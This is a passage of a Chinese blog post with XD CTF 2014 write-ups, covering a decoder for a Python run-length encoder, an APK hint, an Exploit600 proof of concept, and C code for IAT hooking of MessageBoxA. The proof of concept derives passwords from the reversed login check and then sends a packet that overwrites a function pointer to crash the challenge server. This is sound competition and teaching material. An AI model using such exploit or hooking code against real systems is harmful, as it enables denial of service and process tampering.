<h2 id="Crack120"><a href="#Crack120" class="headerlink" title="Crack120"></a>Crack120</h2><p>给了两个文件，有一个是Python编译后的文件，GreatYYX网上找了反编译工具，得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"># Embedded file name: unknownScript.py</div><div class="line">import sys</div><div class="line"></div><div class="line">class Encode(object):</div><div class="line"></div><div class="line">    def __init__(self, ori_data):</div><div class="line">        self.datastream = ori_data</div><div class="line">        self.streamlen = len(ori_data) * 8</div><div class="line">        self.index = 0</div><div class="line">        self.disdata = &apos;&apos;</div><div class="line"></div><div class="line">    def getbit(self, check_type = None):</div><div class="line">        index_bytes = self.index / 8</div><div class="line">        index_bits = self.index % 8</div><div class="line">        if not check_type:</div><div class="line">            self.index += 1</div><div class="line">        if ord(self.datastream[index_bytes]) &amp; 1 &lt;&lt; index_bits:</div><div class="line">            return 1</div><div class="line">        else:</div><div class="line">            return 0</div><div class="line"></div><div class="line">    def encode(self):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        x xxxxxxx</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        _index = 0</div><div class="line">        bit_count = 0</div><div class="line">        char_temp = 0</div><div class="line">        bit_type = self.getbit(check_type=True)</div><div class="line">        for _index in range(self.streamlen):</div><div class="line">            bit = self.getbit()</div><div class="line">            bit_count += 1</div><div class="line">            if bit_type != bit:</div><div class="line">                char_temp |= bit_type &lt;&lt; 7</div><div class="line">                char_temp |= bit_count - 1</div><div class="line">                self.disdata += chr(char_temp)</div><div class="line">                char_temp = 0</div><div class="line">                bit_count = 1</div><div class="line">                bit_type = bit</div><div class="line">                continue</div><div class="line">            elif bit_count &gt;= 127:</div><div class="line">                char_temp |= bit_type &lt;&lt; 7</div><div class="line">                char_temp |= bit_count</div><div class="line">                self.disdata += chr(char_temp)</div><div class="line">                char_temp = 0</div><div class="line">                bit_count = 0</div><div class="line">                bit_type = self.getbit(check_type=True)</div><div class="line">            else:</div><div class="line">                continue</div><div class="line"></div><div class="line">        if bit_count:</div><div class="line">            char_temp |= bit_type &lt;&lt; 7</div><div class="line">            char_temp |= bit_count</div><div class="line">            self.disdata += chr(char_temp)</div><div class="line">        return self.disdata</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    if len(sys.argv) != 3:</div><div class="line">        print &apos;Usage: * SOURCE DEST&apos;</div><div class="line">        return</div><div class="line">    with open(sys.argv[1], &apos;rb&apos;) as _sf:</div><div class="line">        data = _sf.read()</div><div class="line">        encode = Encode(data)</div><div class="line">        with open(sys.argv[2], &apos;wb&apos;) as _df:</div><div class="line">            _df.write(encode.encode())</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<p>又得自己写解码函数，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">class Decode(object):</div><div class="line">    def __init__(self, data):</div><div class="line">        self.encode_data = data</div><div class="line">        self.encode_len = len(data)</div><div class="line">        self.decode_data = &apos;&apos;</div><div class="line"></div><div class="line">    def decode(self):</div><div class="line">        if self.encode_len == 0:</div><div class="line">            return &apos;&apos;</div><div class="line">        data_stream = []</div><div class="line">        for index in xrange(self.encode_len):</div><div class="line">            value = ord(self.encode_data[index])</div><div class="line">            if value &gt;= 128:</div><div class="line">                current_bit = 1</div><div class="line">                delta = value - 128</div><div class="line">            else:</div><div class="line">                current_bit = 0</div><div class="line">                delta = value</div><div class="line">            for i in xrange(delta):</div><div class="line">                data_stream.append(current_bit)</div><div class="line"></div><div class="line">        data_stream_len = len(data_stream)</div><div class="line">        char = 0</div><div class="line">        for i in xrange(1, data_stream_len + 1):</div><div class="line">            if i % 8 == 0:</div><div class="line">                char += data_stream[i - 1] &lt;&lt; 7</div><div class="line">                self.decode_data += chr(char)</div><div class="line">                char = 0</div><div class="line">            else:</div><div class="line">                char += (data_stream[i - 1] &lt;&lt; (i % 8 - 1))</div><div class="line">        return self.decode_data</div></pre></td></tr></table></figure></p>
<p>一开始，以为解码后的是字符串，直接打印出来，发现不对，是一张jpg图片：</p>
<p><img src="/images/xd-crack120.jpg" alt=""></p>
<p>得到：<code>key: xidianZ0L4 weLc0me y0u</code></p>
<h2 id="Crack150"><a href="#Crack150" class="headerlink" title="Crack150"></a>Crack150</h2><p>这道是<code>apk</code>文件，直接用<code>apktool</code>反编译，把代码看了个遍，没发现什么，后来看到<code>assert</code>目录下有张图片，用十六进制编辑器打开，找到key和md5字样，但是他们前后都是乱码，把那段内容拷贝出来，尝试各种编码，后来发现是一段中文，我无力吐槽了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">e2 80 9c 6b 65 79 e2 80 9d e7 9a 84 e5 b0 8f e5 86 99 31 36 e4 bd 8d 6d 64 35 e5 8a a0 e5 af 86</div><div class="line">“key”的小写16位md5加密</div></pre></td></tr></table></figure></p>
<p>然后提交：<code>9c15224a8228b9a9</code></p>
<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="Exploit600"><a href="#Exploit600" class="headerlink" title="Exploit600"></a>Exploit600</h2><h3 id="password生成"><a href="#password生成" class="headerlink" title="password生成"></a>password生成</h3><p>把exploitMe.exe拖进IDA，直接F5，找登录验证部分，其验证逻辑如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">char __usercall login&lt;al&gt;(int a1&lt;eax&gt;, int a2&lt;ecx&gt;, signed int a3, signed int a4)</div><div class="line">	&#123;</div><div class="line">	  signed int v4; // edi@5</div><div class="line">	  int v5; // ecx@6</div><div class="line">	  int v6; // esi@6</div><div class="line">	  unsigned __int8 v7; // al@8</div><div class="line">	  char v8; // cl@13</div><div class="line">	  char result; // al@21</div><div class="line">	  int v10; // [sp+0h] [bp-4h]@6</div><div class="line">	</div><div class="line">	  if ( a2 &amp;&amp; a1 &amp;&amp; a3 &gt;= 4 &amp;&amp; a4 &gt; 0 )</div><div class="line">	  &#123;</div><div class="line">	    v4 = 0;</div><div class="line">	    if ( a3 &gt; 0 )</div><div class="line">	    &#123;</div><div class="line">	      v5 = a2 - a1;</div><div class="line">	      v6 = a1;</div><div class="line">	      v10 = v5;</div><div class="line">	      while ( v4 &lt; a4 )</div><div class="line">	      &#123;</div><div class="line">	        v7 = *(_BYTE *)(v5 + v6);</div><div class="line">	        if ( ((char)v7 &lt; 65 || (char)v7 &gt; 90) &amp;&amp; ((char)v7 &lt; 97 || (char)v7 &gt; 122) &amp;&amp; (unsigned __int8)(v7 - 48) &gt; 9u</div><div class="line">	          || ((v8 = *(_BYTE *)v6, *(_BYTE *)v6 &lt; 65) || v8 &gt; 90)</div><div class="line">	          &amp;&amp; (v8 &lt; 97 || v8 &gt; 122)</div><div class="line">	          &amp;&amp; (unsigned __int8)(v8 - 48) &gt; 9u</div><div class="line">	          || v8 != aAbcdefghijklmn[(v7 + ((unsigned int)v7 &gt;&gt; 2)) % 0x3F] )</div><div class="line">	          return 0;</div><div class="line">	        ++v4;</div><div class="line">	        ++v6;</div><div class="line">	        if ( v4 &gt;= a3 )</div><div class="line">	          break;</div><div class="line">	        v5 = v10;</div><div class="line">	      &#125;</div><div class="line">	    &#125;</div><div class="line">	    result = 1;</div><div class="line">	  &#125;</div><div class="line">	  else</div><div class="line">	  &#123;</div><div class="line">	    result = 0;</div><div class="line">	  &#125;</div><div class="line">	  return result;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>大体意思是：取用户名的单个字符，将ASCII值v7加上v7 / 4，然后模0x3F的值作为索引，去aAbcdefghijklmn里找对应值即为密码的对应字符。我用Python实现了下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&apos;</div><div class="line"></div><div class="line"></div><div class="line">def generator_password(username):</div><div class="line">    password = &apos;&apos;</div><div class="line">    for c in username:</div><div class="line">        value = ord(c)</div><div class="line">        index = (value + value / 4) % 0x3f</div><div class="line">        password += chars[index]</div><div class="line">    return password</div></pre></td></tr></table></figure></p>
<h3 id="崩溃bug"><a href="#崩溃bug" class="headerlink" title="崩溃bug"></a>崩溃bug</h3><p>在登录成功后，会将<code>sub_401050</code>函数地址存放在<code>dword_40DA40 + 66</code>处，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dword_40DA40 = malloc(0x10Cu);</div><div class="line">memset(dword_40DA40, 0, 0x10Cu);</div><div class="line">*((_DWORD *)dword_40DA40 + 66) = sub_401050;</div></pre></td></tr></table></figure></p>
<p>在<code>sub_401050</code>函数中，<code>switch</code>的<code>0x31</code>分支调用，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">case 0x31:</div><div class="line">   (*((void (__stdcall **)(_DWORD, _DWORD))dword_40DA40 + 66))(v4 + 8, v3 - 8);</div><div class="line">   result = 1;</div><div class="line">   break;</div></pre></td></tr></table></figure></p>
<p>但是，在<code>switch</code>的<code>0x20</code>分支，会将接收的数据复制到<code>dword_40DA40</code>中，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">case 0x20:</div><div class="line">    v6 = *(_DWORD *)(v4 + 4);</div><div class="line">    if ( (v6 &amp; 0x80000000u) != 0 || v3 &lt; v6 + 8 || v6 &gt; 0x10C )</div><div class="line">    &#123;</div><div class="line">      result = -2147418114;</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      v7 = *(_DWORD *)(v4 + 4);</div><div class="line">      v8 = dword_40DA40;</div><div class="line">      *((_DWORD *)dword_40DA40 + 65) = v6;</div><div class="line">      memcpy(v8, (const void *)(v4 + 8), v7);</div><div class="line">      result = 1;</div><div class="line">    &#125;</div><div class="line">    break;</div></pre></td></tr></table></figure></p>
<p>所以，这里先去<code>0x20</code>分支，将<code>dword_40DA40</code>存放的<code>sub_401050</code>地址覆盖，然后去<code>0x31</code>分支，调用，从而导致程序访问无法访问的地址，致使其崩溃，效果如下：</p>
<p><img src="/images/XD-Exploit600.png" alt=""></p>
<p>附上POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">def main():</div><div class="line">    if len(sys.argv) != 4:</div><div class="line">        print &apos;Usage: exploitme host port username&apos;</div><div class="line">        return</div><div class="line"></div><div class="line">    try:</div><div class="line">        host = sys.argv[1]</div><div class="line">        port = int(sys.argv[2])</div><div class="line">        username = sys.argv[3]</div><div class="line">        username_len = len(username)</div><div class="line">        if username_len &lt; 4:</div><div class="line">            print &apos;The least length of username is 4!&apos;</div><div class="line">            return</div><div class="line"></div><div class="line">        st = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">        st.connect((host, port))</div><div class="line"></div><div class="line">        # Send name&apos;s length and password&apos;s length</div><div class="line">        packet = &apos;\x10\x00\x00\x00&apos;</div><div class="line">        packet += (struct.pack(&apos;@h&apos;, username_len) + &apos;\x00\x00&apos;) * 2</div><div class="line">        st.send(packet)</div><div class="line"></div><div class="line">        password = generator_password(username)</div><div class="line"></div><div class="line">        # Send name and password</div><div class="line">        st.send(&apos;\x11\x00\x00\x00&apos; + username + &apos;:&apos; + password)</div><div class="line">        r = st.recv(1024)</div><div class="line">        print r</div><div class="line"></div><div class="line">        # Send bug packet</div><div class="line">        packet = &apos;\x20\x00\x00\x00\x0c\x01\x00\x00&apos; + &apos;A&apos; * 0x10c</div><div class="line">        st.sendall(packet)</div><div class="line"></div><div class="line">        packet = &apos;\x31\x00\x00\x00&apos; + &apos;A&apos; * 12</div><div class="line">        st.sendall(packet)</div><div class="line">        st.close()</div><div class="line">    except TypeError:</div><div class="line">        print &apos;Invalid port!&apos;</div><div class="line">    except IOError:</div><div class="line">        pass</div></pre></td></tr></table></figure></p>
<h1 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h1><h2 id="Coding120"><a href="#Coding120" class="headerlink" title="Coding120"></a>Coding120</h2><p>这个没什么好说的，直接看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">#include&lt;windows.h&gt;</div><div class="line"></div><div class="line">PROC PrcMessage=(PROC)MessageBoxA;</div><div class="line"></div><div class="line">BOOL SetApiAddr(HMODULE hMod, PROC OrgAddr, DWORD *NewAddr, char *DllName);</div><div class="line">typedef int (WINAPI *pFMessageBox)(HWND, LPCSTR lpText, LPCSTR lpCaption, UINT uType);</div><div class="line"></div><div class="line">int WINAPI MyMessageBox(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</div><div class="line">&#123;</div><div class="line">	return ((pFMessageBox)PrcMessage)(hWnd, lpText, lpCaption, uType);</div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL APIENTRY DllMain(HANDLE hModule,</div><div class="line">					  DWORD  ul_reason_for_call,</div><div class="line">					  LPVOID lpReserved)</div><div class="line">&#123;</div><div class="line">	if(ul_reason_for_call==DLL_PROCESS_ATTACH)</div><div class="line">	&#123;</div><div class="line">		SetApiAddr(::GetModuleHandle(NULL), PrcMessage, (DWORD *)MyMessageBox, &quot;user32.dll&quot;);</div><div class="line">	&#125;</div><div class="line">	return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//替换IAT表API地址函数</div><div class="line">BOOL SetApiAddr(HMODULE hMod, PROC OrgAddr, DWORD *NewAddr, char *DllName)</div><div class="line">&#123;</div><div class="line">	IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)hMod;</div><div class="line">	IMAGE_OPTIONAL_HEADER * pOptHeader =</div><div class="line">		(IMAGE_OPTIONAL_HEADER *)((BYTE*)hMod + pDosHeader-&gt;e_lfanew + 24);</div><div class="line">	IMAGE_IMPORT_DESCRIPTOR* pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)</div><div class="line">        ((BYTE*)hMod + pOptHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</div><div class="line">	// 在导入表中查找user32.dll模块。因为MessageBoxA函数从user32.dll模块导出</div><div class="line">	while(pImportDesc-&gt;FirstThunk)</div><div class="line">	&#123;</div><div class="line">		char* pszDllName = (char*)((BYTE*)hMod + pImportDesc-&gt;Name);</div><div class="line">		if(lstrcmpiA(pszDllName, DllName) == 0)</div><div class="line">		&#123;</div><div class="line">			break;</div><div class="line">		&#125;</div><div class="line">		pImportDesc++;</div><div class="line">	&#125;</div><div class="line">	if(pImportDesc-&gt;FirstThunk)</div><div class="line">	&#123;</div><div class="line">		// 一个IMAGE_THUNK_DATA结构就是一个双字，它指定了一个导入函数</div><div class="line">		// 调入地址表其实是IMAGE_THUNK_DATA结构的数组，也就是DWORD数组</div><div class="line">		IMAGE_THUNK_DATA* pThunk = (IMAGE_THUNK_DATA*) ((BYTE*)hMod + pImportDesc-&gt;FirstThunk);</div><div class="line">		while(pThunk-&gt;u1.Function)</div><div class="line">		&#123;</div><div class="line">			// lpAddr指向的内存保存了函数的地址</div><div class="line">			DWORD* lpAddr = (DWORD*)&amp;(pThunk-&gt;u1.Function);</div><div class="line">			if(*lpAddr == (DWORD)OrgAddr)</div><div class="line">			&#123;  </div><div class="line">				DWORD dwOldProtect;</div><div class="line">				MEMORY_BASIC_INFORMATION mbi;</div><div class="line">				VirtualQuery(lpAddr, &amp;mbi, sizeof(mbi));</div><div class="line">				VirtualProtect(lpAddr, sizeof(DWORD), PAGE_READWRITE , &amp;dwOldProtect);</div><div class="line">				//修改IAT表项，使其指向我们自定义的函数，</div><div class="line">				::WriteProcessMemory(GetCurrentProcess(), lpAddr, &amp;NewAddr, sizeof(DWORD),NULL);</div><div class="line">				VirtualProtect(lpAddr, sizeof(DWORD), dwOldProtect, 0);</div><div class="line">				return TRUE;</div><div class="line">			&#125;</div><div class="line">			pThunk++;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int APIENTRY WinMain(HINSTANCE hInstance,</div><div class="line">                     HINSTANCE hPrevInstance,</div><div class="line">                     LPSTR     lpCmdLine,</div><div class="line">                     int       nCmdShow)</div><div class="line">&#123;</div><div class="line">	MyMessageBox(NULL, &quot;Hello World!&quot;, &quot;MessageBox&quot;, MB_OK);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a data-url="http://blog.watch0ut.com/2014/10/08/XD-CTF-2014-Write-ups/" data-id="ciyjrunbe000rvfmp1lojgp09" class="article-share-link">分享到</a><div class="tags"><a href="/tags/CTF/">CTF</a></div><div class="post-nav"><a href="/2014/11/10/HCTF-2014-Write-ups/" class="pre">HCTF 2014 Write-ups</a><a href="/2014/09/29/ISG-CTF-2014-Write-up-SQLMAP-Up-to-Date/" class="next">ISG CTF 2014 Write-up (SQLMAP, Up-to-Date)</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="http://blog.watch0ut.com"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Misc/" style="font-size: 15px;">Misc</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/HCTF-2015-Write-ups/">HCTF 2015 Write-ups</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/29/9447-CTF-2015-Write-ups/">9447 CTF 2015 Write-ups</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/11/10/HCTF-2014-Write-ups/">HCTF 2014 Write-ups</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/10/08/XD-CTF-2014-Write-ups/">XD CTF 2014 Write-ups</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/09/29/ISG-CTF-2014-Write-up-SQLMAP-Up-to-Date/">ISG CTF 2014 Write-up (SQLMAP, Up-to-Date)</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/09/29/ISG-CTF-2014-Write-up-Out-of-Space-X-Area/">ISG CTF 2014 Write-up (Out of Space, X-Area)</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/09/29/ISG-CTF-2014-Write-up-Smile-Chopper-Cryptobaby-GIF/">ISG CTF 2014 Write-up (Smile, Chopper, Cryptobaby, GIF)</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/08/26/HITCON-CTF-2014-Tarmful-Write-up/">HITCON CTF 2014 Tarmful Write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/08/22/HITCON-CTF-2014-DIAGCGI-Write-up/">HITCON CTF 2014 DIAGCGI Write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/08/20/HITCON-CTF-2014-PY4H4SHER-Write-up/">HITCON CTF 2014 PY4H4SHER Write-up</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">© <a href="/." rel="nofollow">watch0ut Notebook.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="/css/jquery.fancybox.css?v=0.0.0"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>